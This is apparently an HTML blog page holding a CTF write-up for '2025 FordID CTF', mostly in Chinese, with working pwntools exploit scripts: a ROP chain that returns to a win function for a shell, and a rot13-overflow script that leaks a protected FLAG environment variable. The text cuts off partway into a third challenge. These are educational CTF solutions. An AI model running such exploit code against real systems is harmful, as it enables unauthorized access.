@@ -1,0 +1,784 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="SpongeBob">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pwn（附件：handout 2）Stumbled upon Rust recently, still learning the ropes… 看下程序，是用 rust 语言写的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 FordID CTF">
+<meta property="og:url" content="http://spongebob-369.github.io/2025/09/14/2025-FordID-CTF/index.html">
+<meta property="og:site_name" content="SpongeBobの pineapple house">
+<meta property="og:description" content="pwn（附件：handout 2）Stumbled upon Rust recently, still learning the ropes… 看下程序，是用 rust 语言写的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://spongebob-369.github.io/images/2025-FordID-CTF.png">
+<meta property="og:image" content="http://spongebob-369.github.io/images/2025_FordID-ctf2.png">
+<meta property="article:published_time" content="2025-09-14T12:16:04.000Z">
+<meta property="article:modified_time" content="2025-09-17T13:10:23.708Z">
+<meta property="article:author" content="SpongeBob">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="rust">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://spongebob-369.github.io/images/2025-FordID-CTF.png">
+  
+  
+  
+  <title>2025 FordID CTF - SpongeBobの pineapple house</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"spongebob-369.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025 FordID CTF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-14 20:16" pubdate>
+          September 14, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025 FordID CTF</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="pwn（附件：handout-2）"><a href="#pwn（附件：handout-2）" class="headerlink" title="pwn（附件：handout 2）"></a>pwn（附件：handout 2）</h1><p>Stumbled upon Rust recently, still learning the ropes…</p>
+<p>看下程序，是用 <code>rust</code> 语言写的</p>
+<span id="more"></span>
+<p>64位程序，啥保护没开，简单的ROP，泄露下基址打 <code>libc</code> 然后 <code>system(&#39;/bin/sh&#39;)</code> 。</p>
+<p><img src="/images/2025-FordID-CTF.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>好吧有后门函数，不用打 <code>libc</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.update(arch = <span class="hljs-string">&quot;amd64&quot;</span>, os = <span class="hljs-string">&quot;Linux&quot;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br><br>url = <span class="hljs-string">&quot;0.cloud.chals.io:31984&quot;</span><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, <span class="hljs-built_in">int</span>(POST))<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="hljs-comment"># puts_plt = elf.plt[&#x27;puts&#x27;]</span><br>pop_rdi_ret = <span class="hljs-number">0x23c5ba</span><br>ret = <span class="hljs-number">0x23c334</span><br><span class="hljs-comment"># read_got = elf.got[&#x27;read&#x27;]</span><br><span class="hljs-comment"># vuln = 0x23C520</span><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># b main</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br>win = <span class="hljs-number">0x23C4E0</span><br>bin_sh = <span class="hljs-number">0x2032E0</span><br><br>ru(<span class="hljs-string">b&#x27;Say something:\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + p64(pop_rdi_ret) + p64(<span class="hljs-number">0xDEADBEEFCAFEBABE</span>) + p64(ret) + p64(win)<br>sl(payload)<br>ia()<br></code></pre></td></tr></table></figure>
+
+<h1 id="Protect-the-environment"><a href="#Protect-the-environment" class="headerlink" title="Protect the environment"></a>Protect the environment</h1><p>开了 <code>canary</code> 和 <code>pie</code> 保护</p>
+<p>先看程序里面哪里可能会有漏洞。源码自己写了一个函数： <code>rot13</code> 返回值是一个地址。应该问题就出现在这儿了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rot13</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span> &#123;<br>  <span class="hljs-keyword">while</span> (*s != <span class="hljs-number">0</span>) &#123;<br>    *s += <span class="hljs-number">13</span>;<br>    s++;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-type">char</span> command[<span class="hljs-number">64</span>];<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%63s %63s&quot;</span>, command, name);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;protect&quot;</span>)) &#123;<br>      <span class="hljs-type">char</span> *val = getenv(name);<br>      <span class="hljs-keyword">if</span> (val) &#123;<br>        rot13(val);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Protected %s\n&quot;</span>, name);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such environment variable\n&quot;</span>);<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;print&quot;</span>)) &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;FLAG&quot;</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access denied\n&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">char</span> *val = getenv(name);<br>        <span class="hljs-keyword">if</span> (val) &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s=%s\n&quot;</span>, name, val);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such environment variable\n&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown command\n&quot;</span>);<br>      <span class="hljs-keyword">break</span> ;<br>    &#125;<br>  &#125; <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>先把这个可执行程序的相关动态链接器和链接库给改了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --set-interpreter /home/spongebob/Document/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so pwn<br>patchelf --replace-needed libc.so.6 ~/Document/pwn/protect_our_env/libc-2.27.so  pwn<br></code></pre></td></tr></table></figure>
+
+<p>运行大概分为两种：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; protect<br>PATH<br>Protected PATH<br>&gt; ^C<br>spongebob@spongebob:~/Document/pwn/protect_our_env$ ./pwn<br>&gt; <span class="hljs-built_in">print</span><br>PATH<br>PATH=/home/spongebob/.local/bin:/home/spongebob/.vscode-server/cli/servers/Stable-f220831ea2d946c0dcb0f3eaa480eb435a2c1260/server/bin/remote-cli:/home/spongebob/.cargo/bin:/home/spongebob/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/musl/bin/:/usr/local/musl/bin/<br>&gt; ^C<br></code></pre></td></tr></table></figure>
+
+<p>一个是保护环境变量，然后把这个地址处的环境变量对应的 <code>value</code> 给修改了（用 <code>rot13</code> ）</p>
+<p>另一个是打印环境变量信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; protect<br>PATH<br>Protected PATH<br>&gt; <span class="hljs-built_in">print</span><br>PATH<br>PATH=&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;y|pny&lt;ov&#123;G&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;p|qr:rr&lt;pyv&lt;rr&lt;`noyr:s??=E@&gt;rn?qFACp=qpo=s@rnnAE=roA@Bn?p&gt;?C=&lt;rr&lt;ov&#123;&lt;rz|r:pyvG&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;pnt|&lt;ov&#123;G&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;y|pny&lt;ov&#123;G&lt;&lt;<span class="hljs-string">y|pny&lt;ov&#123;G&lt;&lt;y</span>|pny&lt;ov&#123;G&lt;&lt;<span class="hljs-string">ov&#123;G&lt;&lt;ov</span>&#123;G&lt;ov&#123;G&lt;ov&#123;G&lt;&lt;<span class="hljs-string">tnzrG&lt;&lt;y|pny&lt;tnzrG</span>&lt;&#123;n&#125;&lt;ov&#123;G&lt;&lt;<span class="hljs-string">y|pny&lt;zy&lt;ov&#123;&lt;G&lt;&lt;y</span>|pny&lt;zy&lt;ov&#123;&lt;<br></code></pre></td></tr></table></figure>
+
+<p>应该是写入环境变量相关进行修改，但这方面还没了解过。</p>
+<p>[BUUCTF-pwn]——wdb2018_guess (environ环境变量) 是一道类似的题目</p>
+<p>在Linux C中，environ是一个全局变量，它储存着系统的环境变量。</p>
+<p>它储存在libc中，因此environ是沟通libc地址与栈地址的桥梁。</p>
+<p>好吧整个方向都错了～</p>
+<p>由于 <code>flag</code> 格式都为 <code>FordID&#123;...&#125;</code> ，所以关于 <code>FLAG</code> 环境变量内容应该为：<br>       <code>FLAG=FordID&#123;...&#125;</code></p>
+<p>既然直接 <code>print FLAG</code> 不行，可以通过不断的 <code>protect</code> ，然后将内容中的 <code>F</code> 改为 <code>=</code> ，然后进行： <code>print FLAG=</code> 就行了。</p>
+<p>如何将 <code>F</code> 改为 <code>=</code> 呢？由于源码中:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rot13</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span> &#123;<br>  <span class="hljs-keyword">while</span> (*s != <span class="hljs-number">0</span>) &#123;<br>    *s += <span class="hljs-number">13</span>;<br>    s++;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对字符指针不断进行加会有什么溢出效果，应该是高位溢出不管，一个字节溢出相当于 <code>%256</code> 。调试看一下，如下图所示：</p>
+<p><img src="/images/2025_FordID-ctf2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>所以只需要算出多少轮能从 <code>F</code> 变成 <code>=</code> 就行了。</p>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.update(arch = <span class="hljs-string">&quot;amd64&quot;</span>, os = <span class="hljs-string">&quot;Linux&quot;</span>)<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br><br>url = <span class="hljs-string">&quot;0.cloud.chals.io:33121&quot;</span><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, <span class="hljs-built_in">int</span>(POST))<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>io = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>env_value = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_env_value</span>(<span class="hljs-params">env_name</span>):<br>    ru(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    payload = <span class="hljs-string">&quot;print &quot;</span> + env_name<br>    sl(payload.encode())<br>    data = rl().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;No&quot;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span><br>    data = data.split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>]<br>    env_value[env_name] = data<br><br>env = [<span class="hljs-string">&quot;PATH&quot;</span>,<span class="hljs-string">&quot;HOME&quot;</span>,<span class="hljs-string">&quot;LANG&quot;</span>,<span class="hljs-string">&quot;SHELL&quot;</span>,<span class="hljs-string">&quot;USER&quot;</span>,<span class="hljs-string">&quot;PWD&quot;</span>,<span class="hljs-string">&quot;LOGNAME&quot;</span>,<span class="hljs-string">&quot;TZ&quot;</span>,<span class="hljs-string">&quot;TERM&quot;</span>,<span class="hljs-string">&quot;LC_ALL&quot;</span>,<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>]<br><span class="hljs-keyword">for</span> env_name <span class="hljs-keyword">in</span> env:<br>    test_env_value(env_name)<br><br><span class="hljs-built_in">print</span>(env_value)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>	<span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;F&#x27;</span>) + i * <span class="hljs-number">13</span>) % <span class="hljs-number">256</span>) == <span class="hljs-string">&#x27;=&#x27;</span>:<br>		num = i<br>		<span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&quot;protect FLAG&quot;</span>)<br>    rl()<br><br>sla(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&quot;print FLAG=&quot;</span>)<br>data = rl().decode()<br>data = data.split(<span class="hljs-string">&#x27;G=&#x27;</span>)[<span class="hljs-number">1</span>]<br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> data:<br>    result += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(ch) - <span class="hljs-number">13</span> * <span class="hljs-number">19</span>) % <span class="hljs-number">256</span>)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
+
+<h1 id="Meta-2-0"><a href="#Meta-2-0" class="headerlink" title="Meta 2.0"></a>Meta 2.0</h1><p>这个题给出的 <a target="_blank" rel="noopener" href="http://app.py/"><code>app.py</code></a> 内容如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 